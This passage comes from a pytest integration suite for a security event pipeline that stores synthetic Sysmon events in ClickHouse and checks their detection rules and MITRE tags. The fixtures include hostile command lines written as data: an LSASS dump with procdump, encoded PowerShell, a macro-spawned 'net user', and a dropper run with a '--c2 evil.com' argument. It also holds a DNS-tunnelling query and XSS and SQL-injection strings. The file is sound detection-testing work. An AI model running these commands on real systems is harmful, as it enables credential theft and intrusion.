                "is_suspicious": 1, "detection_rule": "lolbin_certutil",
                "metadata": {"sysmon_event_id": "1", "test_tag": detection_tag},
            },
            # Encoded PowerShell
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9002, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "arguments": f"powershell.exe -enc SGVsbG8gV29ybGQ= det={detection_tag}",
                "cwd": "", "exit_code": -1, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
                "is_suspicious": 1, "detection_rule": "suspicious_powershell",
                "metadata": {"sysmon_event_id": "1", "test_tag": detection_tag},
            },
            # Recon: whoami
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9003, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": "C:\\Windows\\System32\\whoami.exe",
                "arguments": f"whoami det={detection_tag}",
                "cwd": "", "exit_code": 0, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
                "is_suspicious": 1, "detection_rule": "recon_whoami",
                "metadata": {"sysmon_event_id": "1", "test_tag": detection_tag},
            },
            # Credential dumping: procdump
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9004, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": "C:\\temp\\procdump64.exe",
                "arguments": f"procdump64.exe -ma lsass.exe det={detection_tag}",
                "cwd": "", "exit_code": -1, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
                "is_suspicious": 1, "detection_rule": "credential_dumping",
                "metadata": {"sysmon_event_id": "1", "test_tag": detection_tag},
            },
            # Office macro spawn
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9005, "ppid": 2000, "uid": 0, "gid": 0,
                "binary_path": "C:\\Windows\\System32\\cmd.exe",
                "arguments": f"cmd.exe /c net user det={detection_tag}",
                "cwd": "", "exit_code": -1, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
                "is_suspicious": 1, "detection_rule": "office_macro_spawn",
                "metadata": {
                    "sysmon_event_id": "1",
                    "parent_binary": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                    "test_tag": detection_tag,
                },
            },
            # Execution from temp directory
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9006, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": "C:\\Users\\admin\\AppData\\Local\\Temp\\dropper.exe",
                "arguments": f"dropper.exe det={detection_tag}",
                "cwd": "", "exit_code": -1, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
                "is_suspicious": 1, "detection_rule": "exec_from_suspicious_path",
                "metadata": {"sysmon_event_id": "1", "test_tag": detection_tag},
            },
        ]
        _produce_and_flush(kafka_producer, "process-events", events)

    def test_lolbin_detection_ingested(self, ch1, detection_tag):
        found = _wait_for_count(ch1, "process_events", "namespace", "detection-test", 6)
        assert found >= 6, f"Expected 6 detection events, found {found}"

    def test_lolbin_certutil_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule FROM process_events "
            "WHERE namespace = 'detection-test' AND binary_path LIKE '%certutil%' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1  # is_suspicious
        assert result.result_rows[0][1] == "lolbin_certutil"

    def test_powershell_encoded_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule FROM process_events "
            "WHERE namespace = 'detection-test' AND binary_path LIKE '%powershell%' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1
        assert result.result_rows[0][1] == "suspicious_powershell"

    def test_credential_dumping_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule FROM process_events "
            "WHERE namespace = 'detection-test' AND binary_path LIKE '%procdump%' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1
        assert result.result_rows[0][1] == "credential_dumping"

    def test_recon_whoami_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule FROM process_events "
            "WHERE namespace = 'detection-test' AND binary_path LIKE '%whoami%' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1
        assert "recon" in result.result_rows[0][1]

    def test_office_macro_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule, metadata['parent_binary'] "
            "FROM process_events "
            "WHERE namespace = 'detection-test' AND detection_rule = 'office_macro_spawn' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1

    def test_suspicious_path_flagged(self, ch1):
        result = ch1.query(
            "SELECT is_suspicious, detection_rule FROM process_events "
            "WHERE namespace = 'detection-test' AND binary_path LIKE '%Temp%dropper%' LIMIT 1"
        )
        assert len(result.result_rows) >= 1
        assert result.result_rows[0][0] == 1
        assert result.result_rows[0][1] == "exec_from_suspicious_path"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 7: MITRE ATT&CK Coverage
# ═══════════════════════════════════════════════════════════════════════════════


class TestMITREMapping:
    """Verify Sysmon events cover key MITRE ATT&CK techniques."""

    TAG = f"mitre-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce_mitre(self, kafka_producer, ch1):
        events = [
            # T1055 — Process Injection (EID 8)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "defense-evasion", "source": "sysmon",
                "description": f"Remote thread injection mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "defense-evasion", "mitre_technique": "T1055",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "8", "test_tag": self.TAG},
            },
            # T1003.001 — LSASS Credential Dump (EID 10)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "credential-access", "source": "sysmon",
                "description": f"LSASS access detected mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "credential-access", "mitre_technique": "T1003.001",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "10", "test_tag": self.TAG},
            },
            # T1547.001 — Registry Run Keys (EID 13)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "persistence", "source": "sysmon",
                "description": f"Registry Run key modified mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "persistence", "mitre_technique": "T1547.001",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "13", "test_tag": self.TAG},
            },
            # T1055.012 — Process Hollowing (EID 25)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "defense-evasion", "source": "sysmon",
                "description": f"Process tampering detected mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "defense-evasion", "mitre_technique": "T1055.012",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "25", "test_tag": self.TAG},
            },
            # T1547.006 — Driver Load (EID 6)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "persistence", "source": "sysmon",
                "description": f"Unsigned driver loaded mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "persistence", "mitre_technique": "T1547.006",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "6", "test_tag": self.TAG},
            },
            # T1115 — Clipboard Data (EID 24)
            {
                "timestamp": _now_iso(), "severity": 3,
                "category": "collection", "source": "sysmon",
                "description": f"Clipboard accessed mitre={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "MITRE-HOST",
                "mitre_tactic": "collection", "mitre_technique": "T1115",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"sysmon_event_id": "24", "test_tag": self.TAG},
            },
        ]
        _produce_and_flush(kafka_producer, "security-events", events)

    def test_all_mitre_events_ingested(self, ch1):
        found = _wait_for_count(ch1, "security_events", "hostname", "MITRE-HOST", 6)
        assert found >= 6

    @pytest.mark.parametrize("technique", [
        "T1055", "T1003.001", "T1547.001", "T1055.012", "T1547.006", "T1115",
    ])
    def test_technique_present(self, ch1, technique):
        result = ch1.query(
            "SELECT count() FROM security_events "
            "WHERE hostname = 'MITRE-HOST' AND mitre_technique = {t:String}",
            parameters={"t": technique},
        )
        assert result.result_rows[0][0] >= 1, \
            f"MITRE technique {technique} not found in ClickHouse"

    def test_distinct_tactics_cover_key_areas(self, ch1):
        result = ch1.query(
            "SELECT DISTINCT mitre_tactic FROM security_events "
            "WHERE hostname = 'MITRE-HOST'"
        )
        tactics = {row[0] for row in result.result_rows}
        expected = {"defense-evasion", "credential-access", "persistence", "collection"}
        missing = expected - tactics
        assert not missing, f"Missing MITRE tactics: {missing}"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 8: Edge Cases & Malformed Data
# ═══════════════════════════════════════════════════════════════════════════════


class TestEdgeCases:
    """Ensure the pipeline handles edge cases gracefully."""

    TAG = f"edge-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce_edge_cases(self, kafka_producer, ch1):
        events = [
            # Empty string fields
            {
                "timestamp": _now_iso(), "level": "INFO",
                "source": "sysmon", "message": f"edge-empty tag={self.TAG}",
                "metadata": {"sysmon_event_id": "", "test_tag": self.TAG},
            },
            # Missing metadata key
            {
                "timestamp": _now_iso(), "level": "INFO",
                "source": "sysmon", "message": f"edge-no-eid tag={self.TAG}",
                "metadata": {"test_tag": self.TAG},
            },
            # Very long message (10KB)
            {
                "timestamp": _now_iso(), "level": "WARNING",
                "source": "sysmon",
                "message": f"edge-long tag={self.TAG} " + "A" * 10240,
                "metadata": {"test_tag": self.TAG},
            },
            # Unicode in message
            {
                "timestamp": _now_iso(), "level": "INFO",
                "source": "sysmon",
                "message": f"edge-unicode tag={self.TAG} 日本語テスト Ünïcödé ñ 🔒",
                "metadata": {"test_tag": self.TAG},
            },
            # Metadata with many keys
            {
                "timestamp": _now_iso(), "level": "INFO",
                "source": "sysmon",
                "message": f"edge-bigmeta tag={self.TAG}",
                "metadata": {
                    **{f"key_{i}": f"value_{i}" for i in range(50)},
                    "test_tag": self.TAG,
                },
            },
        ]
        _produce_and_flush(kafka_producer, "raw-logs", events)

    def test_empty_fields_ingested(self, ch1):
        """Events with empty metadata values should still be stored."""
        found = _wait_for_count(ch1, "raw_logs", "source", "sysmon", 5)
        assert found >= 5

    def test_long_message_stored(self, ch1):
        result = ch1.query(
            "SELECT length(message) FROM raw_logs "
            "WHERE source = 'sysmon' AND message LIKE '%edge-long%' LIMIT 1"
        )
        if result.result_rows:
            assert result.result_rows[0][0] > 10000, "Long message was truncated"

    def test_unicode_preserved(self, ch1):
        result = ch1.query(
            "SELECT message FROM raw_logs "
            "WHERE source = 'sysmon' AND message LIKE '%edge-unicode%' LIMIT 1"
        )
        if result.result_rows:
            msg = result.result_rows[0][0]
            assert "日本語" in msg or "Ünïcödé" in msg, "Unicode was corrupted"

    def test_large_metadata_stored(self, ch1):
        result = ch1.query(
            "SELECT length(metadata) FROM raw_logs "
            "WHERE source = 'sysmon' AND message LIKE '%edge-bigmeta%' LIMIT 1"
        )
        if result.result_rows:
            assert result.result_rows[0][0] >= 40, "Large metadata was lost"


class TestEdgeCasesSecurity:
    """Edge cases for security events."""

    TAG = f"edge-sec-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = [
            # Severity at boundary (0)
            {
                "timestamp": _now_iso(), "severity": 0,
                "category": "auth", "source": "sysmon",
                "description": f"Severity 0 test tag={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "EDGE-SEC",
                "mitre_tactic": "", "mitre_technique": "",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"test_tag": self.TAG},
            },
            # Severity at boundary (4)
            {
                "timestamp": _now_iso(), "severity": 4,
                "category": "malware", "source": "sysmon",
                "description": f"Severity 4 test tag={self.TAG}",
                "user_id": "", "ip_address": "0.0.0.0", "hostname": "EDGE-SEC",
                "mitre_tactic": "execution", "mitre_technique": "T1059",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"test_tag": self.TAG},
            },
            # Special characters in description
            {
                "timestamp": _now_iso(), "severity": 2,
                "category": "auth", "source": "sysmon",
                "description": f"User 'admin' logged in from <script>alert(1)</script> tag={self.TAG}",
                "user_id": "admin'; DROP TABLE--", "ip_address": "0.0.0.0",
                "hostname": "EDGE-SEC",
                "mitre_tactic": "initial-access", "mitre_technique": "T1078",
                "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"test_tag": self.TAG},
            },
        ]
        _produce_and_flush(kafka_producer, "security-events", events)

    def test_boundary_severities(self, ch1):
        found = _wait_for_count(ch1, "security_events", "hostname", "EDGE-SEC", 3)
        assert found >= 3
        result = ch1.query(
            "SELECT min(severity), max(severity) FROM security_events "
            "WHERE hostname = 'EDGE-SEC'"
        )
        assert result.result_rows[0][0] == 0
        assert result.result_rows[0][1] == 4

    def test_special_chars_not_injected(self, ch1):
        """SQL injection attempts in user_id should be stored as-is, not executed."""
        result = ch1.query(
            "SELECT user_id FROM security_events "
            "WHERE hostname = 'EDGE-SEC' AND user_id != '' LIMIT 1"
        )
        if result.result_rows:
            uid = result.result_rows[0][0]
            assert "DROP" in uid, "Special chars should be stored verbatim"


class TestEdgeCasesNetwork:
    """Edge cases for network events."""

    TAG = f"edge-net-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = [
            # Port 0 (edge case)
            {
                "timestamp": _now_iso(), "hostname": "EDGE-NET",
                "src_ip": "192.168.1.1", "src_port": 0,
                "dst_ip": "10.0.0.1", "dst_port": 0,
                "protocol": "ICMP", "direction": "outbound",
                "bytes_sent": 0, "bytes_received": 0, "duration_ms": 0,
                "pid": 0, "binary_path": "", "container_id": "", "pod_name": "",
                "namespace": "", "dns_query": "", "geo_country": "",
                "is_suspicious": 0, "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            },
            # Port 65535 (max)
            {
                "timestamp": _now_iso(), "hostname": "EDGE-NET",
                "src_ip": "10.0.0.1", "src_port": 65535,
                "dst_ip": "192.168.1.1", "dst_port": 65535,
                "protocol": "TCP", "direction": "inbound",
                "bytes_sent": 0, "bytes_received": 0, "duration_ms": 0,
                "pid": 65535, "binary_path": "", "container_id": "", "pod_name": "",
                "namespace": "", "dns_query": "", "geo_country": "",
                "is_suspicious": 0, "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            },
            # Very long DNS query (potential tunneling indicator)
            {
                "timestamp": _now_iso(), "hostname": "EDGE-NET",
                "src_ip": "192.168.1.100", "src_port": 49152,
                "dst_ip": "8.8.8.8", "dst_port": 53,
                "protocol": "DNS", "direction": "outbound",
                "bytes_sent": 0, "bytes_received": 0, "duration_ms": 0,
                "pid": 4444, "binary_path": "C:\\Windows\\System32\\nslookup.exe",
                "container_id": "", "pod_name": "", "namespace": "",
                "dns_query": "a" * 200 + f".{self.TAG}.tunnel.evil.com",
                "geo_country": "", "is_suspicious": 0, "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            },
        ]
        _produce_and_flush(kafka_producer, "network-events", events)

    def test_edge_ports_ingested(self, ch1):
        found = _wait_for_count(ch1, "network_events", "hostname", "EDGE-NET", 3)
        assert found >= 3

    def test_port_zero_stored(self, ch1):
        result = ch1.query(
            "SELECT count() FROM network_events "
            "WHERE hostname = 'EDGE-NET' AND dst_port = 0"
        )
        assert result.result_rows[0][0] >= 1

    def test_max_port_stored(self, ch1):
        result = ch1.query(
            "SELECT count() FROM network_events "
            "WHERE hostname = 'EDGE-NET' AND dst_port = 65535"
        )
        assert result.result_rows[0][0] >= 1

    def test_long_dns_query_stored(self, ch1):
        result = ch1.query(
            "SELECT length(dns_query) FROM network_events "
            "WHERE hostname = 'EDGE-NET' AND dns_query LIKE '%tunnel.evil.com%' LIMIT 1"
        )
        if result.result_rows:
            assert result.result_rows[0][0] > 200


# ═══════════════════════════════════════════════════════════════════════════════
# Category 9: Cross-Table Correlation (Sysmon Attack Story)
# ═══════════════════════════════════════════════════════════════════════════════


class TestCrossTableCorrelation:
    """Simulate a correlated Sysmon attack across all 4 tables and verify
    events can be joined by hostname and temporal proximity."""

    TAG = f"corr-{uuid.uuid4().hex[:8]}"
    HOST = f"ATTACK-{uuid.uuid4().hex[:6]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce_attack_story(self, kafka_producer, ch1):
        """
        Attack story:
        1. Malicious document drops payload (raw_logs: file create)
        2. Payload executes (process_events: process create)
        3. Payload phones home (network_events: C2 connection)
        4. Payload dumps credentials (security_events: LSASS access)
        """
        ts = _now_iso()

        # Stage 1: File creation
        _produce_and_flush(kafka_producer, "raw-logs", [{
            "timestamp": ts, "level": "WARNING", "source": "sysmon",
            "message": f"File created: C:\\Users\\victim\\AppData\\Temp\\payload.exe by WINWORD.EXE host={self.HOST} tag={self.TAG}",
            "metadata": {
                "sysmon_event_id": "11",
                "original_source_type": "sysmon",
                "test_tag": self.TAG,
            },
        }])

        # Stage 2: Process creation
        _produce_and_flush(kafka_producer, "process-events", [{
            "timestamp": ts, "hostname": self.HOST,
            "pid": 7777, "ppid": 3000, "uid": 0, "gid": 0,
            "binary_path": "C:\\Users\\victim\\AppData\\Temp\\payload.exe",
            "arguments": f"payload.exe --c2 evil.com tag={self.TAG}",
            "cwd": "C:\\Users\\victim", "exit_code": -1,
            "container_id": "", "pod_name": "", "namespace": "",
            "syscall": "CreateProcess",
            "is_suspicious": 1, "detection_rule": "exec_from_suspicious_path",
            "metadata": {
                "sysmon_event_id": "1",
                "parent_binary": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                "test_tag": self.TAG,
            },
        }])

        # Stage 3: C2 connection
        _produce_and_flush(kafka_producer, "network-events", [{
            "timestamp": ts, "hostname": self.HOST,
            "src_ip": "192.168.1.50", "src_port": 51234,
            "dst_ip": "185.199.0.1", "dst_port": 443,
            "protocol": "TCP", "direction": "outbound",
            "bytes_sent": 2048, "bytes_received": 8192, "duration_ms": 500,
            "pid": 7777, "binary_path": "C:\\Users\\victim\\AppData\\Temp\\payload.exe",
            "container_id": "", "pod_name": "", "namespace": "",
            "dns_query": f"{self.TAG}-evil.com", "geo_country": "RU",
            "is_suspicious": 0, "detection_rule": "",
            "metadata": {"sysmon_event_id": "3", "test_tag": self.TAG},
        }])

        # Stage 4: LSASS credential access
        _produce_and_flush(kafka_producer, "security-events", [{
            "timestamp": ts, "severity": 4,
            "category": "credential-access", "source": "sysmon",
            "description": f"LSASS credential dump: payload.exe accessed lsass.exe host={self.HOST} tag={self.TAG}",
            "user_id": "CORP\\victim", "ip_address": "0.0.0.0",
            "hostname": self.HOST,
            "mitre_tactic": "credential-access", "mitre_technique": "T1003.001",
            "ai_confidence": 0.0, "ai_explanation": "",
            "metadata": {"sysmon_event_id": "10", "test_tag": self.TAG},
        }])

    def test_all_four_stages_ingested(self, ch1):
        """All 4 attack stages should be in their respective tables."""
        # Raw log (file creation)
        raw = _wait_for_count(ch1, "raw_logs", "source", "sysmon", 1)
        assert raw >= 1, "Stage 1 (file create) not ingested"

        # Process event
        proc = _wait_for_count(ch1, "process_events", "hostname", self.HOST, 1)
        assert proc >= 1, "Stage 2 (process create) not ingested"

        # Network event
        net = _wait_for_count(ch1, "network_events", "hostname", self.HOST, 1)
        assert net >= 1, "Stage 3 (network connect) not ingested"

        # Security event
        sec = _wait_for_count(ch1, "security_events", "hostname", self.HOST, 1)
        assert sec >= 1, "Stage 4 (LSASS access) not ingested"

    def test_process_and_network_correlate_by_pid(self, ch1):
        """Process and network events should share the same PID (7777)."""
        result = ch1.query(
            "SELECT pid FROM process_events WHERE hostname = {h:String} LIMIT 1",
            parameters={"h": self.HOST},
        )
        proc_pid = result.result_rows[0][0] if result.result_rows else None

        result = ch1.query(
            "SELECT pid FROM network_events WHERE hostname = {h:String} LIMIT 1",
            parameters={"h": self.HOST},
        )
        net_pid = result.result_rows[0][0] if result.result_rows else None

        assert proc_pid == net_pid == 7777, \
            f"PID mismatch: process={proc_pid}, network={net_pid}"

    def test_events_correlate_by_hostname(self, ch1):
        """All attack stages should share the same hostname."""
        tables_fields = [
            ("process_events", "hostname"),
            ("network_events", "hostname"),
            ("security_events", "hostname"),
        ]
        for table, field in tables_fields:
            result = ch1.query(
                f"SELECT {field} FROM {table} WHERE hostname = {{h:String}} LIMIT 1",
                parameters={"h": self.HOST},
            )
            assert len(result.result_rows) >= 1, \
                f"No events with hostname {self.HOST} in {table}"
            assert result.result_rows[0][0] == self.HOST

    def test_security_event_has_mitre_for_credential_access(self, ch1):
        result = ch1.query(
            "SELECT mitre_technique FROM security_events "
            "WHERE hostname = {h:String} LIMIT 1",
            parameters={"h": self.HOST},
        )
        assert result.result_rows[0][0] == "T1003.001"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 10: Central Vector HTTP Routing (Live Test)
# ═══════════════════════════════════════════════════════════════════════════════


class TestVectorHTTPRouting:
    """Test that pre-classified Windows events sent via HTTP to the central
    Vector are routed correctly to the right Redpanda topics and arrive in
    ClickHouse without going through the classification chain."""

    TAG = f"http-route-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _post_events(self, ch1):
        """POST pre-classified events directly to Vector's HTTP endpoint."""
        try:
            # Security event
            _post_to_vector([{
                "clif_event_type": "security",
                "timestamp": _now_iso(),
                "severity": 3,
                "category": "persistence",
                "source": "sysmon-http-test",
                "description": f"HTTP routing test — security event tag={self.TAG}",
                "user_id": "test-user",
                "ip_address": "0.0.0.0",
                "hostname": "HTTP-ROUTE-TEST",
                "mitre_tactic": "persistence",
                "mitre_technique": "T1547.001",
                "ai_confidence": 0.0,
                "ai_explanation": "",
                "metadata": {"test_tag": self.TAG},
            }])

            # Process event
            _post_to_vector([{
                "clif_event_type": "process",
                "timestamp": _now_iso(),
                "hostname": "HTTP-ROUTE-TEST",
                "pid": 12345,
                "ppid": 1,
                "uid": 0,
                "gid": 0,
                "binary_path": "C:\\Windows\\System32\\cmd.exe",
                "arguments": f"cmd.exe /c echo tag={self.TAG}",
                "cwd": "",
                "exit_code": 0,
                "container_id": "",
                "pod_name": "",
                "namespace": "",
                "syscall": "CreateProcess",
                "is_suspicious": 0,
                "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            }])

            # Network event
            _post_to_vector([{
                "clif_event_type": "network",
                "timestamp": _now_iso(),
                "hostname": "HTTP-ROUTE-TEST",
                "src_ip": "192.168.1.1",
                "src_port": 54321,
                "dst_ip": "10.0.0.1",
                "dst_port": 8080,
                "protocol": "TCP",
                "direction": "outbound",
                "bytes_sent": 100,
                "bytes_received": 200,
                "duration_ms": 50,
                "pid": 12345,
                "binary_path": "C:\\Windows\\System32\\cmd.exe",
                "container_id": "",
                "pod_name": "",
                "namespace": "",
                "dns_query": "",
                "geo_country": "",
                "is_suspicious": 0,
                "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            }])

            # Raw event
            _post_to_vector([{
                "clif_event_type": "raw",
                "timestamp": _now_iso(),
                "level": "INFO",
                "source": "sysmon-http-test",
                "message": f"HTTP routing test — raw event tag={self.TAG}",
                "metadata": {"test_tag": self.TAG},
            }])
        except requests.ConnectionError:
            pytest.skip("Vector HTTP endpoint not reachable")

    def test_security_event_routed(self, ch1):
        """Security event should land in security_events table."""
        found = _wait_for_count(
            ch1, "security_events", "source", "sysmon-http-test", 1, timeout=30,
        )
        assert found >= 1, "Security event not routed to security_events"

    def test_process_event_routed(self, ch1):
        """Process event should land in process_events table."""
        found = _wait_for_count(
            ch1, "process_events", "hostname", "HTTP-ROUTE-TEST", 1, timeout=30,
        )
        assert found >= 1, "Process event not routed to process_events"

    def test_network_event_routed(self, ch1):
        """Network event should land in network_events table."""
        found = _wait_for_count(
            ch1, "network_events", "hostname", "HTTP-ROUTE-TEST", 1, timeout=30,
        )
        assert found >= 1, "Network event not routed to network_events"

    def test_raw_event_routed(self, ch1):
        """Raw event should land in raw_logs table."""
        found = _wait_for_count(
            ch1, "raw_logs", "source", "sysmon-http-test", 1, timeout=30,
        )
        assert found >= 1, "Raw event not routed to raw_logs"

    def test_security_event_not_misrouted(self, ch1):
        """Pre-classified security events should NOT appear in raw_logs."""
        time.sleep(5)  # Give time for any misrouted events
        result = ch1.query(
            "SELECT count() FROM raw_logs "
            "WHERE source = 'sysmon-http-test' AND message LIKE '%security event%'"
        )
        assert result.result_rows[0][0] == 0, \
            "Security event was misrouted to raw_logs"

    def test_process_event_preserves_pid(self, ch1):
        result = ch1.query(
            "SELECT pid FROM process_events "
            "WHERE hostname = 'HTTP-ROUTE-TEST' LIMIT 1"
        )
        if result.result_rows:
            assert result.result_rows[0][0] == 12345

    def test_security_event_preserves_mitre(self, ch1):
        result = ch1.query(
            "SELECT mitre_technique FROM security_events "
            "WHERE source = 'sysmon-http-test' LIMIT 1"
        )
        if result.result_rows:
            assert result.result_rows[0][0] == "T1547.001"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 11: Volume / Concurrent Load
# ═══════════════════════════════════════════════════════════════════════════════


class TestSysmonVolume:
    """Test that the pipeline handles Sysmon-scale event volumes."""

    TAG = f"vol-{uuid.uuid4().hex[:8]}"
    COUNT = 1000  # 1K events per type (4K total)

    @pytest.fixture(autouse=True, scope="class")
    def _produce_volume(self, kafka_producer, ch1):
        for topic, gen in [
            ("security-events", lambda i: {
                "timestamp": _now_iso(), "severity": i % 5,
                "category": "auth", "source": "sysmon-vol",
                "description": f"volume test #{i}",
                "user_id": f"user_{i % 100}", "ip_address": "0.0.0.0",
                "hostname": f"VOL-{i % 10}", "mitre_tactic": "credential-access",
                "mitre_technique": "T1110", "ai_confidence": 0.0, "ai_explanation": "",
                "metadata": {"test_tag": self.TAG},
            }),
            ("process-events", lambda i: {
                "timestamp": _now_iso(), "hostname": f"VOL-{i % 10}",
                "pid": i, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": f"C:\\app\\proc{i % 50}.exe",
                "arguments": f"--id {i}", "cwd": "", "exit_code": 0,
                "container_id": "", "pod_name": "", "namespace": "",
                "syscall": "CreateProcess", "is_suspicious": 0, "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            }),
            ("network-events", lambda i: {
                "timestamp": _now_iso(), "hostname": f"VOL-{i % 10}",
                "src_ip": f"10.0.{i % 256}.{(i * 7) % 256}",
                "src_port": 40000 + (i % 25000), "dst_ip": "93.184.216.34",
                "dst_port": 443, "protocol": "TCP", "direction": "outbound",
                "bytes_sent": i * 100, "bytes_received": i * 200,
                "duration_ms": i % 1000, "pid": i, "binary_path": "",
                "container_id": "", "pod_name": "", "namespace": "",
                "dns_query": "", "geo_country": "US",
                "is_suspicious": 0, "detection_rule": "",
                "metadata": {"test_tag": self.TAG},
            }),
            ("raw-logs", lambda i: {
                "timestamp": _now_iso(), "level": "INFO",
                "source": "sysmon-vol",
                "message": f"volume raw #{i}",
                "metadata": {"test_tag": self.TAG},
            }),
        ]:
            events = [gen(i) for i in range(self.COUNT)]
            _produce_and_flush(kafka_producer, topic, events)

    def test_security_volume(self, ch1):
        found = _wait_for_count(
            ch1, "security_events", "source", "sysmon-vol", self.COUNT, timeout=60,
        )
        assert found >= self.COUNT * 0.95, \
            f"Security: expected ≥{int(self.COUNT * 0.95)}, got {found}"

    def test_process_volume(self, ch1):
        result = ch1.query(
            "SELECT count() FROM process_events WHERE hostname LIKE 'VOL-%'"
        )
        found = result.result_rows[0][0]
        assert found >= self.COUNT * 0.95

    def test_network_volume(self, ch1):
        result = ch1.query(
            "SELECT count() FROM network_events WHERE hostname LIKE 'VOL-%'"
        )
        found = result.result_rows[0][0]
        assert found >= self.COUNT * 0.95

    def test_raw_volume(self, ch1):
        found = _wait_for_count(
            ch1, "raw_logs", "source", "sysmon-vol", self.COUNT, timeout=60,
        )
        assert found >= self.COUNT * 0.95
